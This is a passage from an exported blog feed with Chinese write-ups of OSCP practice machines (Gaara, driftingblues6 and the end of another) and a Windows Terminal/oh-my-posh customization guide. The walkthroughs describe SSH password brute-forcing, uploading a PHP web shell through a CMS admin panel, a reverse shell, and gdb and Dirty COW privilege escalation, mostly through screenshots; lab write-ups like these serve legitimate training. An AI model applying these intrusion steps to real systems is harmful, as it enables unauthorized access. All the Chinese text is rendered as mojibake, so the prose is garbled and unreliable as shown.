æœï¼Œåœ¨ç”¨æˆ·å®¶ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªéšè—æ–‡ä»¶</p><p><img src="/img/OSCP-noontide/image-20240822142213554.png" alt="image-20240822142213554"></p><p>ç›´æ¥su å¼±å¯†ç ææƒ</p><p><img src="/img/OSCP-noontide/image-20240822142308081.png" alt="image-20240822142308081"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘CMDç»ˆç«¯ç¾åŒ–è®°å½•â€”oh-my-posh</title>
      <link href="/2024/08/21/Extracurricular-experience-CMD-beautification/"/>
      <url>/2024/08/21/Extracurricular-experience-CMD-beautification/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…¶ä»–ç»éªŒã€‘CMDç»ˆç«¯ç¾åŒ–è®°å½•â€”oh-my-posh"><a href="#ã€å…¶ä»–ç»éªŒã€‘CMDç»ˆç«¯ç¾åŒ–è®°å½•â€”oh-my-posh" class="headerlink" title="ã€å…¶ä»–ç»éªŒã€‘CMDç»ˆç«¯ç¾åŒ–è®°å½•â€”oh-my-posh"></a>ã€å…¶ä»–ç»éªŒã€‘CMDç»ˆç«¯ç¾åŒ–è®°å½•â€”oh-my-posh</h1><h2 id="ä¸€ã€å®‰è£…Windows-Terminal"><a href="#ä¸€ã€å®‰è£…Windows-Terminal" class="headerlink" title="ä¸€ã€å®‰è£…Windows Terminal"></a>ä¸€ã€å®‰è£…Windows Terminal</h2><h3 id="1ã€ç®€å•ä»‹ç»ä¸‹"><a href="#1ã€ç®€å•ä»‹ç»ä¸‹" class="headerlink" title="1ã€ç®€å•ä»‹ç»ä¸‹"></a><strong>1ã€ç®€å•ä»‹ç»ä¸‹</strong></h3><p>Windows Terminal æ˜¯å¾®è½¯å¼€å‘çš„ä¸€æ¬¾æ–°çš„ç»ˆç«¯åº”ç”¨ç¨‹åºï¼Œå®ƒä¸ºå‘½ä»¤è¡Œå·¥å…·æä¾›äº†ä¸€ä¸ªç°ä»£åŒ–çš„ç•Œé¢ã€‚å®ƒæ”¯æŒ PowerShellã€å‘½ä»¤æç¤ºç¬¦ï¼ˆcmdï¼‰ã€WSLï¼ˆWindows Subsystem for Linuxï¼‰ç­‰å¤šç§å‘½ä»¤è¡Œå·¥å…·ã€‚Windows Terminal ä¸æ˜¯ cmdï¼Œä½†å®ƒå¯ä»¥è¿è¡Œ cmdã€‚</p><h3 id="2ã€ä¸‹è½½åœ°å€"><a href="#2ã€ä¸‹è½½åœ°å€" class="headerlink" title="2ã€ä¸‹è½½åœ°å€"></a><strong>2ã€ä¸‹è½½åœ°å€</strong></h3><p>1ã€å¾®è½¯è‡ªå¸¦çš„åº”ç”¨å•†åº—ï¼ˆæ¨èï¼‰</p><p>2ã€GitHub ç›®å‰æœ€æ–°ç‰ˆä¸‹è½½åœ°å€ï¼š<a href="https://github.com/microsoft/terminal/releases/">https://github.com/microsoft/terminal/releases/</a></p><p>è¿™é‡Œæ¨èä½¿ç”¨å¾®è½¯è‡ªå¸¦çš„åº”ç”¨å•†åº—ä¸‹è½½ï¼Œæœ‰äº›é…ç½®ä¼šé»˜è®¤å¸®æˆ‘ä»¬é…ç½®å¥½</p><h3 id="3ã€å¯åŠ¨æ–¹å¼"><a href="#3ã€å¯åŠ¨æ–¹å¼" class="headerlink" title="3ã€å¯åŠ¨æ–¹å¼"></a>3ã€å¯åŠ¨æ–¹å¼</h3><p>ã€win + R è¾“å…¥wt ã€‘å³å¯å¯åŠ¨</p><h3 id="4ã€é…ç½®æˆé»˜è®¤å¯åŠ¨æ–¹å¼"><a href="#4ã€é…ç½®æˆé»˜è®¤å¯åŠ¨æ–¹å¼" class="headerlink" title="4ã€é…ç½®æˆé»˜è®¤å¯åŠ¨æ–¹å¼"></a>4ã€é…ç½®æˆé»˜è®¤å¯åŠ¨æ–¹å¼</h3><p>åœ¨ã€è®¾ç½®ã€‘ä¸­é…ç½®é»˜è®¤ç»ˆç«¯åº”ç”¨ç¨‹åºï¼Œè¿™æ ·ä½¿ç”¨ã€cmdã€‘å‘½ä»¤å³å¯æ‰“å¼€è¯¥ç¨‹åºï¼Œå³ä¸‹è§’è®°å¾—ä¿å­˜</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192518313.png" alt="image-20240821192518313"></p><h2 id="äºŒã€å®‰è£…nerd-å­—ä½“"><a href="#äºŒã€å®‰è£…nerd-å­—ä½“" class="headerlink" title="äºŒã€å®‰è£…nerd å­—ä½“"></a>äºŒã€å®‰è£…nerd å­—ä½“</h2><h3 id="1ã€nerd-å­—ä½“ä»‹ç»"><a href="#1ã€nerd-å­—ä½“ä»‹ç»" class="headerlink" title="1ã€nerd å­—ä½“ä»‹ç»"></a><strong>1ã€nerd å­—ä½“ä»‹ç»</strong></h3><p>å› ä¸ºoh-my-post åœ¨ä½¿ç”¨ä¸­æœ‰å¤šä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸ºäº†ä¸æ˜¾ç¤ºä¹±ç çš„æƒ…å†µï¼Œå®˜æ–¹æ¨èä½¿ç”¨ nerd fonts å­—ä½“</p><h3 id="2ã€ä¸‹è½½æ–¹å¼"><a href="#2ã€ä¸‹è½½æ–¹å¼" class="headerlink" title="2ã€ä¸‹è½½æ–¹å¼"></a><strong>2ã€ä¸‹è½½æ–¹å¼</strong></h3><p>1ã€å®˜ç½‘ä¸‹è½½é“¾æ¥ï¼ˆæ¨èï¼‰ï¼š<a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip">https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip</a></p><p>2ã€ç½‘ä¸Šçœ‹åˆ°çš„ç™¾åº¦ç½‘ç›˜ä¸‹è½½åœ°å€ï¼ˆå®‰å…¨æ€§æœªçŸ¥ï¼Œè¯·è‡ªè¾©ï¼‰ï¼šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1VAcGlRVoQeE59z73A1cEDw">ç™¾åº¦ç½‘ç›˜ è¯·è¾“å…¥æå–ç </a> æå–ç ï¼šuau7</p><h3 id="3ã€å­—ä½“é€‰æ‹©"><a href="#3ã€å­—ä½“é€‰æ‹©" class="headerlink" title="3ã€å­—ä½“é€‰æ‹©"></a><strong>3ã€å­—ä½“é€‰æ‹©</strong></h3><p>ä»å®˜ç½‘ä¸‹è½½çš„æœ‰ä¸‰ä¸ªå­—ä½“æ–‡ä»¶ï¼Œéƒ½å¤§å·®ä¸å·®ï¼Œæˆ‘é€‰æ‹©äº†åç§°çŸ­çš„è¿™ä¸ªï¼Œæ€»ä¹‹æ„Ÿè§‰å“ªä¸ªéƒ½å¯ä»¥ï¼Œæ–‡ä»¶çš„å·¦ä¸Šè§’æœ‰å®‰è£…</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821185053955.png" alt="image-20240821185053955"></p><h3 id="4ã€é…ç½®å­—ä½“"><a href="#4ã€é…ç½®å­—ä½“" class="headerlink" title="4ã€é…ç½®å­—ä½“"></a><strong>4ã€é…ç½®å­—ä½“</strong></h3><p>åœ¨ã€é»˜è®¤å€¼ã€‘çš„ã€å¤–è§‚ã€‘ä¸­é…ç½®å­—ä½“ï¼Œæ³¨æ„ä¿å­˜</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192911748.png" alt="image-20240821192911748"></p><h2 id="ä¸‰ã€oh-my-posh-ä¸‹è½½å®‰è£…"><a href="#ä¸‰ã€oh-my-posh-ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸‰ã€oh-my-posh ä¸‹è½½å®‰è£…"></a>ä¸‰ã€oh-my-posh ä¸‹è½½å®‰è£…</h2><h3 id="ä¸‹è½½oh-my-posh"><a href="#ä¸‹è½½oh-my-posh" class="headerlink" title="ä¸‹è½½oh-my-posh"></a>ä¸‹è½½oh-my-posh</h3><p>1ã€å¾®è½¯åº”ç”¨å•†åº—ä¸‹è½½ï¼ˆæ¨èï¼‰ï¼šç›´æ¥æœç´¢oh-my-posh å°±ä¼šå‡ºæ¥</p><p>2ã€åœ¨Windows Terminal ä¸­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼šwinget install JanDeDobbeleer.OhMyPosh -s winget</p><p>3ã€GitHubä¸‹è½½ï¼Œåœ°å€ä¸è´´äº†ï¼Œè‡ªè¡Œæœç´¢ä¸‹</p><h2 id="å››ã€ç¾åŒ–powershell"><a href="#å››ã€ç¾åŒ–powershell" class="headerlink" title="å››ã€ç¾åŒ–powershell"></a>å››ã€ç¾åŒ–powershell</h2><h3 id="1ã€è¯•ç”¨oh-my-posh-ä¸»é¢˜"><a href="#1ã€è¯•ç”¨oh-my-posh-ä¸»é¢˜" class="headerlink" title="1ã€è¯•ç”¨oh-my-posh ä¸»é¢˜"></a>1ã€è¯•ç”¨oh-my-posh ä¸»é¢˜</h3><p>èµ°åˆ°Terminal çš„powershell ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PoshThemes</span><br></pre></td></tr></table></figure><p>å‡ºæ¥äº†å¾ˆå¤šå…¶ä»–çš„ä¸»é¢˜ï¼Œåœ¨æœ€åç»™äº†ä½¿ç”¨å®ä¾‹ï¼Œé€‰æ‹©ä¸€ä¸ªä¸»é¢˜ï¼Œæ›¿æ¢ç¤ºä¾‹ä¸­çš„<code>jandedobbeleer</code>ï¼Œ</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821205100529.png" alt="image-20240821205100529"></p><p>æˆ‘åœ¨è¿™é‡Œè¯•ç”¨çš„æ˜¯<code>honukai</code> ä¸»é¢˜ï¼Œåˆ™å°†å‘½ä»¤ä¿®æ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¤šæŒ‘æŒ‘é€‰é€‰ï¼Œè¿™ä¸ªåªæ˜¯ä¸´æ—¶çš„è¯•ç”¨</p><h3 id="2ã€æŒä¹…åŒ–ä¿å­˜é…ç½®"><a href="#2ã€æŒä¹…åŒ–ä¿å­˜é…ç½®" class="headerlink" title="2ã€æŒä¹…åŒ–ä¿å­˜é…ç½®"></a>2ã€æŒä¹…åŒ–ä¿å­˜é…ç½®</h3><p>åˆ›å»ºé…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Item -Path $PROFILE -Type File -Force</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°ä¸»é¢˜å¯åŠ¨å‘½ä»¤å¤åˆ¶è¿›å»ä¿å­˜å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>æš‚æ—¶ç¾åŒ–åˆ°è¿™é‡Œï¼Œå…¶ä¸­Terminal æ›´å¤šçš„é…ç½®å¯ä»¥æŒ‰ä¸ªäººå–œå¥½åœ¨è®¾ç½®ä¸­é…ç½®ã€‚</p><p>å¦‚æœpowershellçš„ç¾åŒ–ä¸æƒ³è¦äº†ï¼Œåˆ™é€šè¿‡ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ # æ³¨é‡Šæ‰å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMDç¾åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-Gaara</title>
      <link href="/2024/08/20/OSCP-Gaara/"/>
      <url>/2024/08/20/OSCP-Gaara/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”Gaara"><a href="#OSCPç³»åˆ—é¶æœºâ€”Gaara" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”Gaara"></a>OSCPç³»åˆ—é¶æœºâ€”Gaara</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Gaara/image-20240818171416371.png" alt="image-20240818171416371"></p><h2 id="äºŒã€ç«¯å£æ¢æµ‹"><a href="#äºŒã€ç«¯å£æ¢æµ‹" class="headerlink" title="äºŒã€ç«¯å£æ¢æµ‹"></a>äºŒã€ç«¯å£æ¢æµ‹</h2><h3 id="1ã€å…¨ç«¯å£æ‰«æ"><a href="#1ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="1ã€å…¨ç«¯å£æ‰«æ"></a>1ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Gaara/image-20240818171536703.png" alt="image-20240818171536703"></p><p>ä»…ä»…å­˜åœ¨ä¸¤ä¸ªç«¯å£ï¼ŒApache 2.4.38 å­˜åœ¨SSRFæ¼æ´ï¼Œä¸çŸ¥é“è¿™ä¸ªé¶åœºä¼šä¸ä¼šç”¨å¾—ä¸Š</p><h3 id="2ã€æ¢æµ‹æœåŠ¡ç‰ˆæœ¬"><a href="#2ã€æ¢æµ‹æœåŠ¡ç‰ˆæœ¬" class="headerlink" title="2ã€æ¢æµ‹æœåŠ¡ç‰ˆæœ¬"></a>2ã€æ¢æµ‹æœåŠ¡ç‰ˆæœ¬</h3><p><img src="/img/OSCP-Gaara/image-20240818172419454.png" alt="image-20240818172419454"></p><p>linux 4.x-5.x ï¼Œç‰ˆæœ¬ç¨é«˜ï¼Œä¼°è®¡ä¸å­˜åœ¨è„ç‰›ææƒæ¼æ´</p><h3 id="3ã€å¯¹ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹"><a href="#3ã€å¯¹ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹" class="headerlink" title="3ã€å¯¹ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹"></a>3ã€å¯¹ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-Gaara/image-20240818171936357.png" alt="image-20240818171936357"></p><p>å¹¶æœªæœ‰æ¼æ´å‘ç°</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µæºä»£ç ä¿¡æ¯æ”¶é›†"><a href="#1ã€é¦–é¡µæºä»£ç ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€é¦–é¡µæºä»£ç ä¿¡æ¯æ”¶é›†"></a>1ã€é¦–é¡µæºä»£ç ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Gaara/image-20240818172219685.png" alt="image-20240818172219685"></p><p>éƒ½å¾ˆä¿å®ˆå•Šï¼Œåªæœ‰ä¸€å¼ å¤–éƒ¨é“¾æ¥çš„å›¾ç‰‡ï¼Œæˆ‘è¿™ä¸ªé¶åœºç¯å¢ƒé—®é¢˜å›¾ç‰‡æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥</p><p><img src="/img/OSCP-Gaara/image-20240818172254302.png" alt="image-20240818172254302"></p><h3 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h3><p>è¿™é‡Œéœ€è¦å‡†å¤‡å¤§å­—å…¸æ‰è¡Œ</p><p><img src="/img/OSCP-Gaara/image-20240818174935118.png" alt="image-20240818174935118"></p><p><img src="/img/OSCP-Gaara/image-20240818175014609.png" alt="image-20240818175014609"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸èƒ½æŠŠï¼Œæœç„¶ï¼Œé¡µé¢æºä»£ç ç»™ä¸œè¥¿äº†</p><p><img src="/img/OSCP-Gaara/image-20240818175039632.png" alt="image-20240818175039632"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p><img src="/img/OSCP-Gaara/image-20240818175259054.png" alt="image-20240818175259054"></p><p>ä¼¼ä¹æ˜¯ä¸‰ç¯‡é•¿çš„å·®ä¸å¤šçš„æ–‡ç« ï¼Œç®€å•ç¿»è¯‘è¿‡åï¼Œåœ¨è®²è¿°æŸä¸ªæ•…äº‹</p><p>æˆ‘ä»¬åœ¨ä¸‰ç¯‡æ–‡ç« ä¸­æœç´¢passå…³é”®å­—ï¼Œå‘ç°ä¸ä¸€æ ·çš„åœ°æ–¹</p><p><img src="/img/OSCP-Gaara/image-20240818180001926.png" alt="image-20240818180001926"></p><p>å°è¯•base64è§£å¯†å¤±è´¥ï¼Œçœ‹èµ·æ¥ç¡®å®åƒbaseåŠ å¯†ï¼Œå°è¯•å…¶ä»–baseè§£å¯†</p><p><img src="/img/OSCP-Gaara/image-20240818180237934.png" alt="image-20240818180237934"></p><p>æˆåŠŸè·å–æŸä¸ªç”¨æˆ·çš„è´¦å·å¯†ç ï¼Œå°è¯•sshç™»é™†</p><p><img src="/img/OSCP-Gaara/image-20240818180432566.png" alt="image-20240818180432566"></p><p>å•Šï¼Ÿå¯†ç ä¸å¯¹ï¼Œç¦»äº†ä¸ªå¤§è°±ï¼Œå°è¯•ä¸‹çˆ†ç ´å§ï¼›æˆåŠŸçˆ†ç ´å‡ºæ¥ä¸€ä¸ªå¯†ç </p><p><img src="/img/OSCP-Gaara/image-20240820125758003.png" alt="image-20240820125758003"></p><p>æˆåŠŸGetsehll</p><p><img src="/img/OSCP-Gaara/image-20240820125910626.png" alt="image-20240820125910626"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Gaara/image-20240820132010591.png" alt="image-20240820132010591"></p><p>ç»™äº†ä¸€ä¸ªæç¤ºï¼Œçœ‹ä¸€ä¸‹</p><p><img src="/img/OSCP-Gaara/image-20240820132101723.png" alt="image-20240820132101723"></p><p>ç»™AI åˆ†æä¸‹</p><p><img src="/img/OSCP-Gaara/image-20240820132523801.png" alt="image-20240820132523801"></p><p>BF è¯­è¨€å†™çš„ç¨‹åºï¼Œä½†æ˜¯è¿™ä¸ªé¶æœºä¼¼ä¹æ²¡æœ‰è¿è¡Œç¯å¢ƒï¼Œæš‚æ—¶æç½®</p><h3 id="2ã€æƒé™æå‡"><a href="#2ã€æƒé™æå‡" class="headerlink" title="2ã€æƒé™æå‡"></a>2ã€æƒé™æå‡</h3><p>æŸ¥æ‰¾é«˜æƒé™å‘½ä»¤</p><p><img src="/img/OSCP-Gaara/image-20240820133020771.png" alt="image-20240820133020771"></p><p>æŸ¥æ‰¾gdb ææƒå‘½ä»¤ï¼Œä¸¤å¥è¯ææƒ</p><p><img src="/img/OSCP-Gaara/image-20240820133423265.png" alt="image-20240820133423265"></p><p>æˆåŠŸææƒè‡³root</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”driftingblues6</title>
      <link href="/2024/07/30/OSCP-driftingblues6/"/>
      <url>/2024/07/30/OSCP-driftingblues6/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”driftingblues6"><a href="#OSCPç³»åˆ—é¶æœºâ€”driftingblues6" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”driftingblues6"></a>OSCPç³»åˆ—é¶æœºâ€”driftingblues6</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-driftingblues6/image-20240730181037863.png" alt="image-20240730181037863"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-driftingblues6/image-20240730181110594.png" alt="image-20240730181110594"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-driftingblues6/image-20240730181503239.png" alt="image-20240730181503239"></p><p>åªå¼€æ”¾äº†80ç«¯å£</p><p>3ã€æœåŠ¡ç‰ˆæœ¬æ‰«æ</p><p><img src="/img/OSCP-driftingblues6/image-20240730181515900.png" alt="image-20240730181515900"></p><p>80ä½¿ç”¨apache 2.2.22ç‰ˆæœ¬ï¼Œç®—æ˜¯ä¸€ä¸ªä½ç‰ˆæœ¬ï¼›ä½¿ç”¨linux 3.2-3.16çš„ä¸€ä¸ªç³»ç»Ÿç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬ä¹Ÿæ˜¯ä½ç‰ˆæœ¬ï¼Œå­˜åœ¨å¯èƒ½çš„æ¼æ´</p><p>4ã€æ¼æ´æ¢æµ‹</p><p><img src="/img/OSCP-driftingblues6/image-20240730182436530.png" alt="image-20240730182436530"></p><p>åªåšäº†ç›®å½•æ‰«æ</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µå’Œæºä»£ç "><a href="#1ã€é¦–é¡µå’Œæºä»£ç " class="headerlink" title="1ã€é¦–é¡µå’Œæºä»£ç "></a>1ã€é¦–é¡µå’Œæºä»£ç </h3><p><img src="/img/OSCP-driftingblues6/image-20240730181243631.png" alt="image-20240730181243631"></p><p><img src="/img/OSCP-driftingblues6/image-20240730181303628.png" alt="image-20240730181303628"></p><p>åœ¨æºä»£ç ä¸­å‘ç°äº†ä¸€äº›ä¸œè¥¿ï¼Œä¸è¿‡å¯¹è¿™ä¸ªé¶åœºä¼¼ä¹æ²¡ä»€ä¹ˆä½œç”¨</p><h3 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h3><p><img src="/img/OSCP-driftingblues6/image-20240730181838025.png" alt="image-20240730181838025"></p><p>å‡ºæ¥ä¸€äº›æœ‰è¶£çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</p><p><img src="/img/OSCP-driftingblues6/image-20240730182549959.png" alt="image-20240730182549959"></p><p>å¹¶ä¸”ç»™äº†æˆ‘ä»¬ä¸€ä¸ªé‡è¦çš„æç¤ºï¼Œ<code>.zip</code></p><h3 id="3ã€æŒ‡å®šåç¼€æ‰«æ"><a href="#3ã€æŒ‡å®šåç¼€æ‰«æ" class="headerlink" title="3ã€æŒ‡å®šåç¼€æ‰«æ"></a>3ã€æŒ‡å®šåç¼€æ‰«æ</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185532900.png" alt="image-20240730185532900"></p><p>æ‰«åˆ°ä¸€ä¸ªä¹‹å‰æ²¡æ‰«åˆ°çš„å®¶ä¼™</p><p><img src="/img/OSCP-driftingblues6/image-20240730202032703.png" alt="image-20240730202032703"></p><h3 id="4ã€spammer-zip"><a href="#4ã€spammer-zip" class="headerlink" title="4ã€spammer.zip"></a>4ã€spammer.zip</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185930263.png" alt="image-20240730185930263"></p><p>éœ€è¦å¯†ç ï¼Œåšhashè½¬æ¢å’Œç ´è§£</p><p><img src="/img/OSCP-driftingblues6/image-20240730185948589.png" alt="image-20240730185948589"></p><p>ç»™åˆ°å¯†ç </p><p><img src="/img/OSCP-driftingblues6/image-20240730190030543.png" alt="image-20240730190030543"></p><p>ä¼¼ä¹æ˜¯ä¸€ç»„è´¦å·å¯†ç </p><h3 id="5ã€textpatternç™»é™†åå°"><a href="#5ã€textpatternç™»é™†åå°" class="headerlink" title="5ã€textpatternç™»é™†åå°"></a>5ã€textpatternç™»é™†åå°</h3><p><img src="/img/OSCP-driftingblues6/image-20240730182933263.png" alt="image-20240730182933263"></p><p>è¾“å…¥è´¦å·å¯†ç ï¼ŒæˆåŠŸç™»é™†åå°</p><p><img src="/img/OSCP-driftingblues6/image-20240730201935141.png" alt="image-20240730201935141"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><h3 id="1ã€æ¼æ´æŸ¥è¯¢"><a href="#1ã€æ¼æ´æŸ¥è¯¢" class="headerlink" title="1ã€æ¼æ´æŸ¥è¯¢"></a>1ã€æ¼æ´æŸ¥è¯¢</h3><p>è¿›æ¥ä¹‹åï¼Œåœ¨ä¸‹é¢èƒ½çœ‹åˆ°å½“å‰cms çš„ç‰ˆæœ¬å·</p><p><img src="/img/OSCP-driftingblues6/image-20240730202556693.png" alt="image-20240730202556693"></p><p>æŸ¥æ‰¾æ¼æ´</p><p><img src="/img/OSCP-driftingblues6/image-20240730202625552.png" alt="image-20240730202625552"></p><p>è¿™ä¿©éƒ½æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œè¿›è¡Œå°è¯•ï¼›é¦–å…ˆå°è¯•ç¬¬ä¸€ä¸ª</p><p>è„šæœ¬å†…ç»™å‡ºäº†ä½¿ç”¨æ–¹æ³•</p><p><img src="/img/OSCP-driftingblues6/image-20240730202720117.png" alt="image-20240730202720117"></p><p>å°è¯•æ‰§è¡Œï¼Œä¼¼ä¹æ‰§è¡Œå¤±è´¥äº†ï¼Œæç¤ºæ–‡ä»¶ä¸Šä¼ æ˜¯None</p><p><img src="/img/OSCP-driftingblues6/image-20240730203205877.png" alt="image-20240730203205877"></p><p>å†æ¬¡æŸ¥çœ‹ä½¿ç”¨æ–¹æ³•ï¼Œä¾ç„¶å‡ºé”™</p><p><img src="/img/OSCP-driftingblues6/image-20240730214524552.png" alt="image-20240730214524552"></p><h3 id="2ã€åå°ä¸Šä¼ æ–‡ä»¶getshell"><a href="#2ã€åå°ä¸Šä¼ æ–‡ä»¶getshell" class="headerlink" title="2ã€åå°ä¸Šä¼ æ–‡ä»¶getshell"></a>2ã€åå°ä¸Šä¼ æ–‡ä»¶getshell</h3><p>æœ€ç»ˆå»åå°æ‰¾æ¼æ´ç‚¹äº†ï¼ŒæˆåŠŸä¸Šä¼ shell.php</p><p><img src="/img/OSCP-driftingblues6/image-20240730214657701.png" alt="image-20240730214657701"></p><p>ä¹‹å‰åšç›®å½•æ‰«æï¼Œå‘ç°æœ‰<code>files</code>çš„ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="/img/OSCP-driftingblues6/image-20240730214745282.png" alt="image-20240730214745282"></p><p>OKï¼Œå¥½æäº†ï¼Œåå¼¹shell</p><p><img src="/img/OSCP-driftingblues6/image-20240730214944409.png" alt="image-20240730214944409"></p><p>æˆåŠŸåå¼¹shell</p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-driftingblues6/image-20240730215555584.png" alt="image-20240730215555584"></p><p>æœç„¶ï¼Œç‰ˆæœ¬å¾ˆä½ï¼Œå°è¯•è„ç‰›ææƒ</p><h3 id="2ã€è„ç‰›ææƒ"><a href="#2ã€è„ç‰›ææƒ" class="headerlink" title="2ã€è„ç‰›ææƒ"></a>2ã€è„ç‰›ææƒ</h3><p>æœç´¢ä¸€ä¸‹</p><p><img src="/img/OSCP-driftingblues6/image-20240730220405248.png" alt="image-20240730220405248"></p><p>è¿™é‡Œä½¿ç”¨ä¹‹å‰ç”¨åˆ°è¿‡çš„ 40839.c è¿™ä¸ªè„šæœ¬</p><p><img 